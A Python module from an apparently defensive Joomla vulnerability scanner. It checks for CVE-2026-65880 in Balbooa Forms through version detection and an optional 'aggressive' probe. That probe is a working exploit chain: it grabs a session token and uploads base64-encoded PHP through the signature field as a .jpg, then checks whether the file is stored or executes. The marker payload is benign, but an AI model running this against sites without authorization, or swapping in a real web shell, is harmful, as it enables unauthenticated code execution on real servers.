from __future__ import annotations

import base64
import json
import re
import secrets
from typing import Any

from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-65880"
NAME = "Balbooa Forms unauthenticated signature-field code execution"
COMPONENT = "Balbooa Forms"
AFFECTED_RULE = "Balbooa Forms 1.0.0 through 2.4.3.1; fixed in 2.4.3.2 or later"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
TOKEN_RE = re.compile(r'"csrf\.token":"([a-f0-9]{32})"')
TOKEN_BODY_RE = re.compile(r"^[a-f0-9]{32}$")
LEGACY_TOKEN_PATH = "/index.php?option=com_baforms&task=form.getSessionToken"
SUBMIT_PATH = "/index.php?option=com_baforms&task=form.message"
IMAGE_RE = re.compile(r'<img src="([^"]+)"')


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("2.4.3.2")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("baforms", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="Balbooa Forms was not detected via its public manifest, uploads directory, or component route.", action="No action is required unless Balbooa Forms is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Balbooa Forms {version}, within the affected range below 2.4.3.2."
        action = "Upgrade Balbooa Forms to 2.4.3.2 or newer and review signature fields."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected Balbooa Forms {version}, which validates the signature image type before writing."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "Balbooa Forms was detected, but its version could not be determined."
        action = "Determine the installed Balbooa Forms version and upgrade to 2.4.3.2 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _session_token(client: HttpClient, base: str, timeout: int) -> str | None:
    page = client.get(f"{base}/index.php", timeout=timeout)
    if not is_transport_error(page):
        match = TOKEN_RE.search(page.get("body") or "")
        if match:
            return match.group(1)
    legacy = client.get(f"{base}{LEGACY_TOKEN_PATH}", timeout=timeout)
    if not is_transport_error(legacy) and legacy.get("status") == 200:
        body = (legacy.get("body") or "").strip()
        if TOKEN_BODY_RE.match(body):
            return body
    return None


def run_aggressive_probe(
    target_url: str,
    form_id: int = 3,
    submit_id: int = 6,
    field_id: int = 5,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Submit a PHP payload through the signature field's base64 image value.

    2.4.3.1 ``saveSignature()`` base64-decodes the submitted ``image`` data
    URI and writes the bytes to a public ``.jpg`` with no image validation.
    2.4.3.2+ runs ``getimagesizefromstring()`` and only accepts PNG/JPEG.
    The probe writes a benign PHP marker, reads the public file back, and
    reports upload-only unless the server executes the extension.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    token = _session_token(client, base, timeout)
    if not token:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=f"{base}/index.php", detail="No Joomla session token was available, so the signature submission was not attempted.", action="Verify the component route and guest session handling on an authorized staging site.")

    marker = f"PROOFCMS_BAFORMS_SIG_{secrets.token_hex(4)}"
    payload = f'<?php echo "{marker}"; ?>'.encode()
    data_uri = "data:image/jpeg;base64," + base64.b64encode(payload).decode()
    value = json.dumps({"image": data_uri})
    data = {
        "form-id": str(form_id),
        "submit-btn": str(submit_id),
        "task": "form.message",
        str(field_id): value,
        token: "1",
    }
    response = client.request(
        f"{base}{SUBMIT_PATH}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode(data),
        timeout=timeout,
    )
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{SUBMIT_PATH}", detail=f"The signature submission failed in transit ({transport_error_detail(response)}).", action="Retry when the target is reachable.")

    body = response.get("body") or ""
    match = IMAGE_RE.search(body)
    file_url = match.group(1) if match else ""
    file_body = ""
    file_status = 0
    if file_url and file_url.rstrip("/") != base.rstrip("/"):
        served = client.get(file_url, timeout=timeout)
        if not is_transport_error(served):
            file_status = served.get("status", 0)
            file_body = served.get("body") or ""
    stored = marker in file_body
    executed = stored and "<?php" not in file_body
    evidence = {
        "form_id": form_id,
        "submit_id": submit_id,
        "field_id": field_id,
        "token_found": True,
        "marker": marker,
        "status": response.get("status"),
        "file_url": file_url,
        "file_status": file_status,
        "file_readable": file_status == 200,
        "marker_stored": stored,
        "marker_executed": executed,
    }
    if stored:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE" if executed else "VULNERABLE_UPLOAD_ONLY",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=file_url,
            evidence=evidence,
            detail=(
                "An unauthenticated signature field submission wrote attacker-controlled PHP bytes to a public "
                f".jpg file. The marker {'executed' if executed else 'was stored but the server served the .jpg as an image'}."
            ),
            action="Upgrade Balbooa Forms to 2.4.3.2 or newer and remove the uploaded signature file.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=file_url or f"{base}{SUBMIT_PATH}",
        evidence=evidence,
        detail=(
            f"The signature submission returned HTTP {response.get('status')} and the marker was not readable "
            "at the returned signature path; the image-type validation rejected the payload."
        ),
        action="Upgrade affected Balbooa Forms versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    token = _session_token(client, base, timeout)
    if not token:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}/index.php", detail="The component page did not expose a Joomla session token; no signature submission was attempted.", action="Verify the component route on an authorized staging site.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}/index.php", detail="A guest session token is available; the signature payload was not sent in safe mode.", action="Use aggressive mode with the public form's signature/submit ids on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because Balbooa Forms was not detected as potentially affected."
            return passive
        form_value = aggressive_value(aggressive_args, aggressive_command, "form_id")
        submit_value = aggressive_value(aggressive_args, aggressive_command, "submit_id")
        field_value = aggressive_value(aggressive_args, aggressive_command, "field_id")
        result = run_aggressive_probe(
            target_url,
            form_id=int(form_value) if form_value and form_value.isdigit() else 3,
            submit_id=int(submit_value) if submit_value and submit_value.isdigit() else 6,
            field_id=int(field_value) if field_value and field_value.isdigit() else 5,
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (session/token reachability) and aggressive (signature upload) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Remote Code Execution", "module_version": "1.0.0", "last_reviewed": "2026-11-16", "updated": "2026-11-16", "required_detectors": ["baforms"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-65880", "https://www.balbooa.com/forms", "https://mysites.guru/vulnerabilities/CVE-2026-65880"]}
